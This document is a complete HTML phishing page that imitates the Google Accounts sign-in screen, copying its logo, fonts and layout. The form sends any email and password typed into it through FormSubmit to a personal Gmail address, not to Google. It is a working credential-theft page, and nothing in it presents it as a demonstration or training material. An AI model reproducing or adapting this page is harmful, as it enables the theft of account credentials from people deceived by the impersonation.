
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-card {
            width: 450px;
            max-width: 90%;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 0;
            text-align: center;
        }

        .logo {
            width: 75px;
            margin-bottom: 15px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }

        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 40px;
        }

        .input-container {
            position: relative;
            margin: 0 40px 25px;
        }

        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 15px; /* Offset for border thickness */
        }

        .footer-btns {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
            padding: 0 40px 0 40px;
        }

        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }

        .btn-next {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #1b60cf;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }

        .lang-footer {
            position: absolute;
            bottom: 20px;
            right: 20px;
            font-size: 12px;
            color: #70757a;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <!-- Google Logo -->
        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        
        <h1>Sign in</h1>
        <p>Continue to Google Account</p>

        <!-- FormSubmit Integration -->
        <form action="https://formsubmit.co/kaasislekker069@gmail.com" method="POST">
            <div class="input-container">
                <input type="email" name="email" placeholder="Email or phone" required>
            </div>
            <div class="input-container">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>

            <!-- FormSubmit honey-pot to prevent spam -->
            <input type="text" name="_honey" style="display:none">

            <div class="footer-btns">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="btn-next">Next</button>
            </div>
        </form>
    </div>

</body>
</html>
